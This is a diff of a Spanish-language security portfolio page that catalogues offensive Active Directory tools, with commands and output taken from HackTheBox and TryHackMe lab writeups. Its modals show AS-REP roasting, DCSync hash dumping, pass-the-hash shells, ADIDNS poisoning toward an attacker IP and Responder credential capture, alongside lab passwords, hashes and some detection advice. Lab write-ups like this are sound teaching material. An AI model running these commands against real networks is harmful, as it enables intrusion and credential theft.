-    <span class="tag">MitM</span>
-    <span class="tag">Cleartext Creds</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('responder')">
+      <div class="tool-card-top">
+        <span class="tool-name">Responder</span>
+        <span class="tool-category">CREDENTIAL CAPTURE</span>
+      </div>
+      <div class="tool-title">LLMNR / MSSQL Credential Capture</div>
+      <p class="tool-desc">Servidor falso multi-protocolo (SMB, HTTP, MSSQL, FTP, LDAP) para capturar hashes NTLMv2 y credenciales en texto claro mediante envenenamiento de protocolos de resolución.</p>
+      <div class="tool-footer">
+        <span class="tag">LLMNR Poisoning</span><span class="tag">NTLMv2 Hash</span>
+        <span class="tag">Cleartext Creds</span><span class="tag">MitM</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('hashcat')">
-  <div class="tool-card-top">
-    <span class="tool-name">hashcat</span>
-    <span class="tool-category">CRACKING</span>
-  </div>
-  <div class="tool-title">Offline Hash Cracking (GPU)</div>
-  <p class="tool-desc">El cracker de contraseñas más rápido del mundo. Soporta +300 tipos de hash y múltiples modos de ataque: diccionario, máscara, combinator y rule-based.</p>
-  <div class="tool-footer">
-    <span class="tag">GPU</span>
-    <span class="tag">NTLM</span>
-    <span class="tag">AS-REP</span>
-    <span class="tag">NetNTLMv2</span>
-    <span class="tag">Kerberoasting</span>
-  </div>
-</div>
+    <div class="tool-card" onclick="openModal('hashcat')">
+      <div class="tool-card-top">
+        <span class="tool-name">hashcat</span>
+        <span class="tool-category">CRACKING</span>
+      </div>
+      <div class="tool-title">Offline Hash Cracking (GPU)</div>
+      <p class="tool-desc">El cracker de contraseñas más rápido del mundo. Soporta +300 tipos de hash y múltiples modos de ataque: diccionario, máscara, combinator y rule-based con aceleración GPU.</p>
+      <div class="tool-footer">
+        <span class="tag">GPU</span><span class="tag">NTLM</span>
+        <span class="tag">AS-REP etype23</span><span class="tag">Kerberoasting</span>
+      </div>
+    </div>
 
-<div class="tool-card" onclick="openModal('evilwinrm')">
-  <div class="tool-card-top">
-    <span class="tool-name">evil-winrm</span>
-    <span class="tool-category">POST-EXPLOITATION</span>
-  </div>
-  <div class="tool-title">Remote Shell via WinRM</div>
-  <p class="tool-desc">Shell interactiva avanzada sobre Windows Remote Management. Soporta Pass-the-Hash, carga de scripts en memoria, bypass de AMSI y upload/download de ficheros.</p>
-  <div class="tool-footer">
-    <span class="tag">WinRM</span>
-    <span class="tag">Pass-the-Hash</span>
-    <span class="tag">AMSI Bypass</span>
-    <span class="tag">Post-Exploitation</span>
-  </div>
-</div>
-```
+    <div class="tool-card" onclick="openModal('evilwinrm')">
+      <div class="tool-card-top">
+        <span class="tool-name">evil-winrm</span>
+        <span class="tool-category">POST-EXPLOITATION</span>
+      </div>
+      <div class="tool-title">Remote Shell via WinRM</div>
+      <p class="tool-desc">Shell interactiva avanzada sobre WinRM (5985/5986). Soporta Pass-the-Hash, carga de scripts en memoria, bypass de AMSI, upload/download y evasión de logging PS.</p>
+      <div class="tool-footer">
+        <span class="tag">WinRM</span><span class="tag">Pass-the-Hash</span>
+        <span class="tag">AMSI Bypass</span><span class="tag">File Transfer</span>
+      </div>
+    </div>
 
   </div>
 
   <!-- WRITEUPS SECTION -->
-
   <div class="section-header" id="writeups">
     <span class="section-title">Writeups publicados</span>
     <div class="section-line"></div>
@@ -400,145 +576,238 @@ h1 { font-size: 2rem; }
 
   <div class="writeups-wrapper">
 
-```
-<!-- Spookysec -->
-<a class="writeup-card" href="spookysec.html">
-  <div class="writeup-card-inner">
-    <div class="writeup-card-body">
-      <div class="tool-card-top" style="margin-bottom:0.8rem;">
-        <span class="tool-name">Spookysec Ltd.</span>
-        <span class="tool-category">TRYHACKME · ACTIVE DIRECTORY</span>
+    <!-- Overwatch -->
+    <a class="writeup-card" href="overwatch.html">
+      <div class="writeup-card-inner">
+        <div class="writeup-card-body">
+          <div class="writeup-meta">
+            <span class="writeup-badge htb">HackTheBox</span>
+            <span class="writeup-badge">Active Directory</span>
+            <span class="writeup-badge">Windows Server 2022</span>
+            <span class="writeup-date">11 May 2026</span>
+          </div>
+          <div class="writeup-title">Overwatch — SYSTEM via .NET RE + DNS Poisoning + WCF Injection</div>
+          <p class="writeup-subtitle">
+            De SMB anónimo a NT AUTHORITY\SYSTEM en 5 pasos. Ingeniería inversa de un binario .NET con dnSpy
+            revela credenciales hardcodeadas y un endpoint WCF vulnerable. DNS poisoning vía BloodyAD + Responder
+            captura credenciales en texto claro. WCF KillProcess() injection → shell SYSTEM.
+          </p>
+          <div class="writeup-findings">
+            <span class="finding-pill pill-critical">1 Critical</span>
+            <span class="finding-pill pill-high">4 High</span>
+            <span class="finding-pill pill-med">1 Medium</span>
+            <span class="finding-pill pill-info">1 Info</span>
+          </div>
+          <div class="tool-footer">
+            <span class="tag">SMB Anonymous</span><span class="tag">dnSpy</span>
+            <span class="tag">BloodyAD</span><span class="tag">Responder</span>
+            <span class="tag">MSSQL Linked Server</span><span class="tag">WCF Injection</span>
+          </div>
+        </div>
+        <div class="writeup-card-arrow">→</div>
       </div>
-      <div class="tool-title">Attacktive Directory — Full Domain Compromise</div>
-      <p class="tool-desc" style="margin-top:0.5rem;">
-        Internal pentest sobre el dominio SPOOKYSEC.LOCAL. Cadena de ataque desde enumeración anónima Kerberos hasta Domain Admin via DCSync + Pass-the-Hash. 7 findings · 5 High.
-      </p>
-      <div class="tool-footer" style="margin-top:1rem;">
-        <span class="tag">AS-REP Roasting</span>
-        <span class="tag">DCSync</span>
-        <span class="tag">Pass-the-Hash</span>
-        <span class="tag">SMB Enumeration</span>
-        <span class="tag">TryHackMe</span>
-      </div>
-    </div>
-    <div class="writeup-card-arrow">→</div>
-  </div>
-</a>
+    </a>
 
-<!-- Overwatch -->
-<a class="writeup-card" href="overwatch.html">
-  <div class="writeup-card-inner">
-    <div class="writeup-card-body">
-      <div class="tool-card-top" style="margin-bottom:0.8rem;">
-        <span class="tool-name">Overwatch</span>
-        <span class="tool-category">HACKTHEBOX · ACTIVE DIRECTORY</span>
+    <!-- Spookysec -->
+    <a class="writeup-card" href="spookysec.html">
+      <div class="writeup-card-inner">
+        <div class="writeup-card-body">
+          <div class="writeup-meta">
+            <span class="writeup-badge thm">TryHackMe</span>
+            <span class="writeup-badge">Active Directory</span>
+            <span class="writeup-badge">Windows Server 2019</span>
+            <span class="writeup-date">7 Feb 2026</span>
+          </div>
+          <div class="writeup-title">Spookysec — Domain Admin via AS-REP Roasting + DCSync + Pass-the-Hash</div>
+          <p class="writeup-subtitle">
+            Compromiso completo del dominio SPOOKYSEC.LOCAL desde cero credenciales. Enumeración Kerberos sin
+            autenticación → AS-REP Roasting → hash cracking → backup share con credenciales en Base64 →
+            DCSync → volcado del NTDS.dit → Pass-the-Hash como Domain Administrator.
+          </p>
+          <div class="writeup-findings">
+            <span class="finding-pill pill-high">5 High</span>
+            <span class="finding-pill pill-med">1 Medium</span>
+            <span class="finding-pill pill-info">1 Info</span>
+          </div>
+          <div class="tool-footer">
+            <span class="tag">kerbrute</span><span class="tag">AS-REP Roasting</span>
+            <span class="tag">hashcat</span><span class="tag">DCSync</span>
+            <span class="tag">NTDS.dit</span><span class="tag">Pass-the-Hash</span>
+          </div>
+        </div>
+        <div class="writeup-card-arrow">→</div>
       </div>
-      <div class="tool-title">Overwatch HTB — SYSTEM via WCF Injection</div>
-      <p class="tool-desc" style="margin-top:0.5rem;">
-        Internal pentest sobre Windows Server 2022 / overwatch.htb. De SMB anónimo a NT AUTHORITY\SYSTEM mediante ingeniería inversa .NET, DNS poisoning, Responder y inyección WCF. 7 findings · 5 High.
-      </p>
-      <div class="tool-footer" style="margin-top:1rem;">
-        <span class="tag">SMB Anonymous</span>
-        <span class="tag">DNS Poisoning</span>
-        <span class="tag">Responder</span>
-        <span class="tag">WCF Injection</span>
-        <span class="tag">HackTheBox</span>
-      </div>
-    </div>
-    <div class="writeup-card-arrow">→</div>
-  </div>
-</a>
-```
+    </a>
 
   </div>
 
 </div><!-- /page -->
 
-<!-- MODALS -->
-
+<!-- MODAL -->
 <div class="modal-overlay" id="modal-overlay" onclick="closeModal(event)">
   <div class="modal" id="modal-content"></div>
 </div>
 
+<!-- FOOTER -->
 <footer>
-  OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups
+  <span>OJM.SEC · Oriol Jaen Mirabet · Security Research &amp; Writeups</span>
+  <div style="display:flex;gap:1.5rem;">
+    <a href="https://github.com/ojamirabet" target="_blank">GitHub</a>
+    <a href="https://app.hackthebox.com/profile/ojamirabet" target="_blank">HackTheBox</a>
+  </div>
 </footer>
 
 <script>
 const tools = {
-  kerbrute: {
-    label: 'RECON · Kerberos', title: 'kerbrute',
+
+  nmap: {
+    label: 'RECON · Port Scanning',
+    title: 'nmap',
     sections: [
-      { heading: 'Qué es', content: `<p>kerbrute es una herramienta de Go diseñada para realizar enumeración y brute-force de cuentas de usuario de dominio a través del protocolo Kerberos (puerto 88/TCP). A diferencia de otras técnicas de enumeración, no necesita credenciales válidas y opera de forma sigilosa ya que las peticiones erróneas no generan eventos de autenticación fallida (Event ID 4625) en el DC.</p><p>El truco está en que el KDC responde de forma diferente ante un usuario válido (KDC_ERR_PREAUTH_REQUIRED) vs. uno inválido (KDC_ERR_C_PRINCIPAL_UNKNOWN), permitiendo distinguir usuarios existentes.</p>` },
-      { heading: 'Uso en el lab · Spookysec', content: `<pre><span class="cmd-comment"># Enumeración de usuarios con wordlist</span>\n<span class="cmd-tool">./kerbrute_linux_amd64</span> userenum \\\n<span class="cmd-flag">--dc</span> <span class="cmd-value">spookysec.local</span> \\\n<span class="cmd-flag">-d</span> <span class="cmd-value">spookysec.local</span> \\\nuserlist.txt\n\n<span class="cmd-comment"># Output</span>\n[+] VALID USERNAME: james@spookysec.local\n[+] VALID USERNAME: svc-admin@spookysec.local\n[+] VALID USERNAME: backup@spookysec.local</pre>` },
+      { heading: 'Qué es', content: `<p>Nmap (Network Mapper) es el escáner de red de referencia en pentesting. Combina descubrimiento de hosts, escaneo de puertos, detección de versiones y un motor de scripting (NSE) que permite ejecutar cientos de checks de enumeración y vulnerabilidades.</p>` },
+      { heading: 'Flujo de trabajo en labs', content: `<pre><span class="cmd-comment"># Fase 1: todos los puertos, rápido</span>\n<span class="cmd-tool">nmap</span> <span class="cmd-flag">-p-</span> --open <span class="cmd-flag">-sS</span> --min-rate 5000 <span class="cmd-flag">-n -Pn</span> TARGET <span class="cmd-flag">-oG</span> allports\n\n<span class="cmd-comment"># Fase 2: versiones + scripts en puertos abiertos</span>\n<span class="cmd-tool">nmap</span> <span class="cmd-flag">-sCV</span> <span class="cmd-flag">-p</span> PORT1,PORT2,... TARGET <span class="cmd-flag">-oN</span> targeted\n\n<span class="cmd-comment"># Extraer el dominio de los banners NTLM</span>\nnmap ... | grep -i "dns_domain_name"</pre>` },
+      { heading: 'Flags esenciales', content: `<ul><li><strong>-p-</strong> — todos los puertos (1-65535)</li><li><strong>-sS</strong> — SYN scan (stealth, requiere root)</li><li><strong>-sCV</strong> — versiones + scripts NSE por defecto</li><li><strong>--min-rate 5000</strong> — velocidad mínima de paquetes</li><li><strong>-Pn</strong> — no hacer ping previo (útil cuando ICMP está bloqueado)</li><li><strong>-oG / -oN / -oA</strong> — guardar output en grepable / normal / todos</li></ul>` },
+      { heading: 'Interpretando un DC Windows', content: `<ul><li>Puertos <strong>53, 88, 389, 445, 636, 3268</strong> → Domain Controller confirmado</li><li>Puerto <strong>5985</strong> → WinRM activo (posible shell remota)</li><li>Puerto <strong>1433 / no estándar</strong> → MSSQL (buscar banners NTLM para extraer dominio)</li><li>Banner <strong>Product_Version: 10.0.20348</strong> → Windows Server 2022</li></ul>` }
+    ],
+    tags: ['Recon', 'Port Scan', 'NSE', 'Service Detection', 'OS Fingerprint', 'T1046'],
+    ref: 'Usado en: Overwatch HTB (Fase 1) · Spookysec THM (Fase 1)'
+  },
 
-```
-  { heading: 'Modos disponibles', content: `<ul><li><strong>userenum</strong> — Enumera usuarios válidos con una wordlist</li><li><strong>bruteuser</strong> — Brute-force de contraseña de un usuario concreto</li><li><strong>passwordspray</strong> — Prueba una contraseña contra múltiples usuarios</li><li><strong>bruteforce</strong> — Combina user + password en pares</li></ul>` },
-  { heading: 'Detección y mitigación', content: `<ul><li>Monitorizar Event ID 4768 (Kerberos AS Request) en volumen anómalo</li><li>Rate-limiting en el puerto 88 a nivel de red</li><li>Desplegar cuentas honeypot para detectar enumeración</li></ul>` }
-],
-tags: ['Kerberos', 'User Enum', 'Active Directory', 'Recon', 'T1087.002'],
-ref: 'Usado en: Spookysec Ltd. — Attacktive Directory (TryHackMe) · Paso 1 del attack chain'
-```
+  kerbrute: {
+    label: 'RECON · Kerberos',
+    title: 'kerbrute',
+    sections: [
+      { heading: 'Qué es', content: `<p>kerbrute es una herramienta Go para enumeración y brute-force de cuentas de usuario de dominio vía Kerberos (puerto 88/TCP). Funciona sin necesidad de credenciales porque el KDC responde de forma diferente ante un usuario válido (<code>KDC_ERR_PREAUTH_REQUIRED</code>) vs. uno inválido (<code>KDC_ERR_C_PRINCIPAL_UNKNOWN</code>).</p><p>Las peticiones erróneas no generan Event ID 4625 (logon failure) en el DC, lo que lo hace más sigiloso que otros métodos de enumeración.</p>` },
+      { heading: 'Uso en el lab · Spookysec', content: `<pre><span class="cmd-comment"># Enumeración de usuarios con wordlist</span>\n<span class="cmd-tool">./kerbrute_linux_amd64</span> userenum \\\n  <span class="cmd-flag">--dc</span> spookysec.local \\\n  <span class="cmd-flag">-d</span> spookysec.local \\\n  userlist.txt\n\n<span class="cmd-comment"># Output — usuarios válidos encontrados</span>\n[+] VALID USERNAME: james@spookysec.local\n[+] VALID USERNAME: <span class="cmd-value">svc-admin@spookysec.local</span>\n[+] VALID USERNAME: backup@spookysec.local</pre>` },
+      { heading: 'Modos disponibles', content: `<ul><li><strong>userenum</strong> — enumera usuarios válidos con wordlist</li><li><strong>bruteuser</strong> — brute-force de contraseña para un usuario concreto</li><li><strong>passwordspray</strong> — una contraseña contra múltiples usuarios (evita lockout)</li><li><strong>bruteforce</strong> — combina user + password en pares</li></ul>` },
+      { heading: 'Detección y mitigación', content: `<ul><li>Monitorizar Event ID 4768 en volumen anómalo (muchas AS-REQ en poco tiempo)</li><li>Rate-limiting en el puerto 88 a nivel de firewall/IPS</li><li>Desplegar cuentas honeypot para detectar enumeración masiva</li></ul>` }
+    ],
+    tags: ['Kerberos', 'User Enum', 'Active Directory', 'Recon', 'Stealth', 'T1087.002'],
+    ref: 'Usado en: Spookysec Ltd. — Attacktive Directory (TryHackMe) · Paso 1 del attack chain'
+  },
 
-},
-impacket: {
-label: ‘EXPLOITATION · Active Directory’, title: ‘Impacket’,
-sections: [
-{ heading: ‘Qué es’, content: `<p>Impacket es una colección de clases Python de bajo nivel para trabajar con protocolos de red Windows: SMB, MSRPC, NTLM, Kerberos, LDAP, etc. Es la navaja suiza del pentesting en entornos AD.</p>` },
-{ heading: ‘GetNPUsers.py — AS-REP Roasting’, content: `<pre><span class="cmd-tool">python3 GetNPUsers.py</span> spookysec.local/ \\\n<span class="cmd-flag">-usersfile</span> valid_users.txt \\\n<span class="cmd-flag">-no-pass</span> \\\n<span class="cmd-flag">-dc-ip</span> <span class="cmd-value">10.10.181.132</span>\n\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a62a1f7d...</pre>` },
-{ heading: ‘secretsdump.py — DCSync’, content: `<pre><span class="cmd-tool">python3 secretsdump.py</span> \\\n<span class="cmd-flag">-just-dc</span> backup@<span class="cmd-value">10.10.181.132</span>\n\nAdministrator:500:aad3b435...:0e0363213e37b942...\nsvc-admin:1103:aad3b435...:fc0f1e5359e372aa...</pre>` },
-{ heading: ‘Detección y mitigación’, content: `<ul><li>Habilitar pre-autenticación Kerberos en TODAS las cuentas</li><li>Auditar DCSync con Event ID 4662</li><li>Usar BloodHound para auditar DCSync rights</li></ul>` }
-],
-tags: [‘Kerberos’, ‘AS-REP’, ‘DCSync’, ‘NTDS.dit’, ‘SMB’, ‘T1558.004’, ‘T1003.003’],
-ref: ‘Usado en: Spookysec Ltd. — Pasos 2 y 6 · AS-REP Roasting + DCSync’
-},
-hashcat: {
-label: ‘CREDENTIAL ACCESS · Hash Cracking’, title: ‘hashcat’,
-sections: [
-{ heading: ‘Qué es’, content: `<p>hashcat es el cracker de contraseñas más rápido del mundo, con soporte para GPU (CUDA/OpenCL). Soporta más de 300 tipos de hash y múltiples modos de ataque: diccionario, fuerza bruta, combinator, rule-based, etc.</p>` },
-{ heading: ‘Uso en el lab · AS-REP hash’, content: `<pre><span class="cmd-tool">hashcat</span> \\\n<span class="cmd-flag">-m</span> <span class="cmd-value">18200</span> \\\nsvc-admin.hash \\\n/usr/share/wordlists/rockyou.txt\n\n<span class="cmd-comment"># Resultado</span>\n$krb5asrep$23$svc-admin...:management2005\nStatus: Cracked</pre>` },
-{ heading: ‘Modos de hash relevantes para AD’, content: `<ul><li><strong>1000</strong> — NTLM</li><li><strong>5600</strong> — NetNTLMv2</li><li><strong>13100</strong> — Kerberoasting (TGS-REP)</li><li><strong>18200</strong> — AS-REP Roasting</li></ul>` }
-],
-tags: [‘Hash Cracking’, ‘GPU’, ‘AS-REP’, ‘NTLM’, ‘rockyou’, ‘T1110.002’],
-ref: ‘Usado en: Spookysec Ltd. — Paso 3 · svc-admin → management2005’
-},
-smbclient: {
-label: ‘ENUMERATION · SMB’, title: ‘smbclient’,
-sections: [
-{ heading: ‘Qué es’, content: `<p>smbclient es el cliente SMB de la suite Samba para Linux. Permite conectarse a recursos compartidos de red Windows/Samba desde la línea de comandos, con una interfaz similar a FTP.</p>` },
-{ heading: ‘Uso en el lab · Spookysec’, content: `<pre><span class="cmd-comment"># Listar shares</span>\n<span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> //10.10.181.132 <span class="cmd-flag">-U</span> <span class="cmd-value">svc-admin%management2005</span>\n\n<span class="cmd-comment"># Acceder al share backup</span>\n<span class="cmd-tool">smbclient</span> //10.10.181.132/backup <span class="cmd-flag">-U</span> <span class="cmd-value">svc-admin%management2005</span>\nsmb: \\> get backup_credentials.txt</pre>` },
-{ heading: ‘Comandos útiles en shell SMB’, content: `<ul><li><strong>ls</strong> — Listar ficheros</li><li><strong>get &lt;file&gt;</strong> — Descargar fichero</li><li><strong>put &lt;file&gt;</strong> — Subir fichero</li><li><strong>recurse ON / mget *</strong> — Descargar estructura completa</li></ul>` }
-],
-tags: [‘SMB’, ‘File Access’, ‘Enumeration’, ‘Credentials’, ‘T1039’, ‘T1552.001’],
-ref: ‘Usado en: Spookysec Ltd. — Paso 4 · Acceso al share backup y recuperación de backup_credentials.txt’
-},
-evilwinrm: {
-label: ‘POST-EXPLOITATION · WinRM’, title: ‘Evil-WinRM’,
-sections: [
-{ heading: ‘Qué es’, content: `<p>Evil-WinRM es una shell interactiva para Windows Remote Management (WinRM, puerto 5985/5986). Soporta Pass-the-Hash, upload/download de ficheros, carga de scripts en memoria, bypass de AMSI y evasión de logging de PowerShell.</p>` },
-{ heading: ‘Uso en el lab · Pass-the-Hash’, content: `<pre><span class="cmd-tool">evil-winrm</span> \\\n<span class="cmd-flag">-i</span> <span class="cmd-value">10.10.181.132</span> \\\n<span class="cmd-flag">-u</span> Administrator \\\n<span class="cmd-flag">-H</span> <span class="cmd-value">0e0363213e37b94221497260b0bcb4fc</span>\n\n*Evil-WinRM* PS C:\\Users\\Administrator\\Documents> whoami\nspookysec\\administrator</pre>` },
-{ heading: ‘Funcionalidades destacadas’, content: `<ul><li>Autenticación con contraseña o hash NTLM (Pass-the-Hash)</li><li><strong>upload / download</strong> de ficheros directamente en la shell</li><li>Bypass de AMSI integrado</li><li>Carga de scripts PowerShell desde rutas locales</li></ul>` }
-],
-tags: [‘WinRM’, ‘Pass-the-Hash’, ‘NTLM’, ‘Post-Exploitation’, ‘Shell’, ‘T1550.002’],
-ref: ‘Usado en: Spookysec Ltd. — Paso 7 · Domain compromise via Pass-the-Hash’
-}
+  smbclient: {
+    label: 'ENUMERATION · SMB',
+    title: 'smbclient',
+    sections: [
+      { heading: 'Qué es', content: `<p>smbclient es el cliente SMB de la suite Samba para Linux. Permite conectarse a recursos compartidos de red Windows/Samba desde la línea de comandos con una interfaz similar a FTP. Esencial para enumerar shares, acceder con sesión nula y transferir ficheros.</p>` },
+      { heading: 'Null session — SMB anónimo', content: `<pre><span class="cmd-comment"># Listar shares sin credenciales (null session)</span>\n<span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> \\\\\\\\TARGET <span class="cmd-flag">-U</span> '' <span class="cmd-flag">-N</span>\n\n<span class="cmd-comment"># Acceder a un share anónimo</span>\n<span class="cmd-tool">smbclient</span> \\\\\\\\TARGET\\\\software$ <span class="cmd-flag">-U</span> ''\nsmb: \\> ls\nsmb: \\> get overwatch.exe</pre>` },
+      { heading: 'Acceso autenticado y descarga recursiva', content: `<pre><span class="cmd-comment"># Listar shares con credenciales</span>\n<span class="cmd-tool">smbclient</span> <span class="cmd-flag">-L</span> //TARGET <span class="cmd-flag">-U</span> <span class="cmd-value">'DOMAIN\\usuario%password'</span>\n\n<span class="cmd-comment"># Descarga recursiva de todo el share</span>\n<span class="cmd-tool">smbclient</span> //TARGET/backup <span class="cmd-flag">-U</span> 'usuario%pass' \\\n  <span class="cmd-flag">-c</span> 'recurse ON; prompt OFF; mget *'</pre>` },
+      { heading: 'Comandos útiles en la shell SMB', content: `<ul><li><strong>ls</strong> — listar ficheros del directorio actual</li><li><strong>get &lt;file&gt;</strong> — descargar fichero</li><li><strong>put &lt;file&gt;</strong> — subir fichero</li><li><strong>cd &lt;dir&gt;</strong> — cambiar directorio</li><li><strong>recurse ON / mget *</strong> — descarga completa de estructura</li></ul>` }
+    ],
+    tags: ['SMB', 'Null Session', 'File Access', 'Enumeration', 'T1039', 'T1135'],
+    ref: 'Usado en: Overwatch HTB (Fase 2 — software$) · Spookysec THM (Fase 5 — backup share)'
+  },
+
+  dnspy: {
+    label: 'REVERSE ENGINEERING · .NET',
+    title: 'dnSpy',
+    sections: [
+      { heading: 'Qué es', content: `<p>dnSpy es un descompilador y depurador para assemblies .NET (C#, VB.NET, F#). A diferencia de otros lenguajes compilados, el bytecode CIL de .NET conserva nombres de clases, métodos y variables, permitiendo a dnSpy reconstruir código C# casi idéntico al original.</p><p>Con el fichero <code>.pdb</code> (símbolos de debug) presente, la experiencia es completa: se ven líneas exactas del código fuente original.</p>` },
+      { heading: 'Hallazgos en Overwatch', content: `<pre><span class="cmd-comment">// CheckEdgeHistory() — credenciales hardcodeadas</span>\nusing (SqlConnection conn = new SqlConnection(\n  <span class="cmd-value">"Server=localhost;Database=SecurityLogs;"</span> +\n  <span class="cmd-value">"User Id=sqlsvc;Password=TI0LKcfHzZw1Vv;"</span>))\n\n<span class="cmd-comment">// KillProcess() — inyección de comandos PowerShell</span>\nstring scriptContents =\n  <span class="cmd-value">"Stop-Process -Name " + processName + " -Force"</span>;\n<span class="cmd-comment">// ← processName no sanitizado → OS Command Injection</span></pre>` },
+      { heading: 'Por qué .NET es tan reversible', content: `<ul><li>El bytecode CIL conserva nombres de métodos, clases y propiedades</li><li>Los archivos <code>.pdb</code> añaden información de línea y variable</li><li>No es código nativo — no hay ofuscación por defecto</li><li>Alternativas: ILSpy, dotPeek, Ghidra (.NET plugin), de4dot para desofuscar</li></ul>` },
+      { heading: 'Qué buscar en un binario .NET', content: `<ul><li>Connection strings con contraseñas (SqlConnection, connectionString)</li><li>Uso de <code>Process.Start()</code> o <code>PowerShell Runspace</code> con input externo</li><li>Claves API o tokens hardcodeados en strings</li><li>Interfaces WCF/SOAP expuestas (ServiceContract, OperationContract)</li></ul>` }
+    ],
+    tags: ['.NET', 'C# Decompile', 'Reverse Engineering', 'Credential Extraction', 'WCF', 'T1552.001'],
+    ref: 'Usado en: Overwatch HTB (Fase 3) — descubrimiento de sqlsvc creds + WCF KillProcess vector'
+  },
+
+  impacket: {
+    label: 'EXPLOITATION · Active Directory',
+    title: 'Impacket',
+    sections: [
+      { heading: 'Qué es', content: `<p>Impacket es una colección de clases Python de bajo nivel para trabajar con protocolos de red Windows: SMB, MSRPC, NTLM, Kerberos, LDAP, MSSQL, etc. Es la navaja suiza del pentesting AD — la mayoría de técnicas de ataque tienen un script de Impacket que las implementa.</p>` },
+      { heading: 'GetNPUsers.py — AS-REP Roasting', content: `<pre><span class="cmd-tool">python3 GetNPUsers.py</span> spookysec.local/ \\\n  <span class="cmd-flag">-usersfile</span> valid_users.txt \\\n  <span class="cmd-flag">-no-pass</span> \\\n  <span class="cmd-flag">-dc-ip</span> <span class="cmd-value">10.10.X.X</span> \\\n  <span class="cmd-flag">-outputfile</span> hashes.txt\n\n$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:a62a1...</pre>` },
+      { heading: 'mssqlclient.py — MSSQL interactivo', content: `<pre><span class="cmd-tool">mssqlclient.py</span> overwatch.htb/sqlsvc:<span class="cmd-value">TI0LKcfHzZw1Vv</span>@TARGET \\\n  <span class="cmd-flag">-p</span> 6520 <span class="cmd-flag">-windows-auth</span>\n\nSQL> EXEC sp_linkedservers;\nSQL> EXEC ('select 1') AT [SQL07];</pre>` },
+      { heading: 'secretsdump.py — DCSync / NTDS.dit', content: `<pre><span class="cmd-tool">python3 secretsdump.py</span> \\\n  <span class="cmd-flag">-just-dc</span> backup@TARGET\n\nAdministrator:500:aad3b435...<span class="cmd-value">:0e0363213e37b942...</span>:::\nsvc-admin:1103:aad3b435...<span class="cmd-value">:fc0f1e5359e372aa...</span>:::</pre>` },
+      { heading: 'Otros scripts útiles', content: `<ul><li><strong>GetUserSPNs.py</strong> — Kerberoasting (TGS-REP hashes)</li><li><strong>psexec.py / wmiexec.py</strong> — shell remota vía SMB / WMI</li><li><strong>ticketer.py</strong> — Golden/Silver Ticket</li><li><strong>lookupsid.py</strong> — enumeración de SIDs del dominio</li></ul>` }
+    ],
+    tags: ['Kerberos', 'AS-REP', 'DCSync', 'NTDS.dit', 'MSSQL', 'SMB', 'T1558.004', 'T1003.003'],
+    ref: 'Usado en: Overwatch HTB (mssqlclient — Fase 4) · Spookysec THM (GetNPUsers — Fase 3, secretsdump — Fase 7)'
+  },
+
+  bloodyad: {
+    label: 'AD ATTACKS · ACL Abuse',
+    title: 'BloodyAD',
+    sections: [
+      { heading: 'Qué es', content: `<p>BloodyAD es un framework Python para interactuar con Active Directory a nivel de protocolo LDAP/SAMR/DRSUAPI. Permite auditar permisos, leer/escribir atributos de objetos AD, inyectar registros DNS en ADIDNS y explotar ACLs sin necesidad de herramientas pesadas como BloodHound+SharpHound.</p>` },
+      { heading: 'Verificar permisos WRITE — Overwatch', content: `<pre><span class="cmd-tool">bloodyAD</span> <span class="cmd-flag">-d</span> overwatch.htb <span class="cmd-flag">-u</span> sqlsvc <span class="cmd-flag">-p</span> TI0LKcfHzZw1Vv \\\n  <span class="cmd-flag">--dc-ip</span> TARGET get writable\n\nCN=sqlsvc,...  attribute: dnsNode  permission: <span class="cmd-value">WRITE</span></pre>` },
+      { heading: 'Inyección de registro DNS (ADIDNS)', content: `<pre><span class="cmd-comment"># Crear registro A: SQL07 → IP atacante</span>\n<span class="cmd-tool">bloodyAD</span> <span class="cmd-flag">-d</span> overwatch.htb <span class="cmd-flag">-u</span> sqlsvc <span class="cmd-flag">-p</span> TI0LKcfHzZw1Vv \\\n  <span class="cmd-flag">--dc-ip</span> TARGET add dnsRecord SQL07 10.10.15.115\n\n[+] <span class="cmd-value">SQL07 has been successfully added</span></pre>` },
+      { heading: 'Por qué ADIDNS es peligroso', content: `<ul><li>AD Integrated DNS almacena registros en objetos LDAP del dominio</li><li>Por defecto, usuarios autenticados pueden añadir nuevos registros (dynamic updates)</li><li>Permite MitM de cualquier nombre DNS no existente que otro host intente resolver</li><li>Combinado con Responder o ntlmrelayx: captura o relay de credenciales</li></ul>` }
+    ],
+    tags: ['Active Directory', 'ADIDNS', 'ACL Abuse', 'DNS Injection', 'LDAP', 'T1584.002', 'T1557'],
+    ref: 'Usado en: Overwatch HTB (Fase 5) — creación de registro DNS SQL07 para MitM del linked server MSSQL'
+  },
+
+  responder: {
+    label: 'CREDENTIAL CAPTURE · MitM',
+    title: 'Responder',
+    sections: [
+      { heading: 'Qué es', content: `<p>Responder es un envenenador de protocolos de resolución de nombres (LLMNR, NBT-NS, mDNS) y servidor falso multi-protocolo (SMB, HTTP, MSSQL, FTP, LDAP, WPADproxy). Captura hashes NTLMv1/v2 cuando otros hosts intentan resolver nombres inexistentes o conectarse a servicios que Responder está simulando.</p>` },
+      { heading: 'Uso en Overwatch — cleartext MSSQL', content: `<pre><span class="cmd-comment"># Levantar Responder en la interfaz VPN</span>\n<span class="cmd-tool">sudo responder</span> <span class="cmd-flag">-I</span> tun0 <span class="cmd-flag">-w -d</span>\n\n<span class="cmd-comment"># Resultado cuando SQL Server se conecta a SQL07 (nuestro host)</span>\n[MSSQL] Cleartext Client   : TARGET_IP\n[MSSQL] Cleartext Username : <span class="cmd-value">sqlmgmt</span>\n[MSSQL] Cleartext Password : <span class="cmd-value">bIhBbzMMnB82yx</span></pre>` },
+      { heading: 'Modos de captura', content: `<ul><li><strong>LLMNR/NBT-NS poisoning</strong> — responde a resoluciones fallidas en la LAN, captura NTLMv2</li><li><strong>MSSQL server</strong> — captura credenciales de linked servers que usan SQL auth</li><li><strong>HTTP/SMB</strong> — captura hashes al recibir peticiones de autenticación NTLM</li><li><strong>-A (Analyze mode)</strong> — modo pasivo, solo escucha sin responder</li></ul>` },
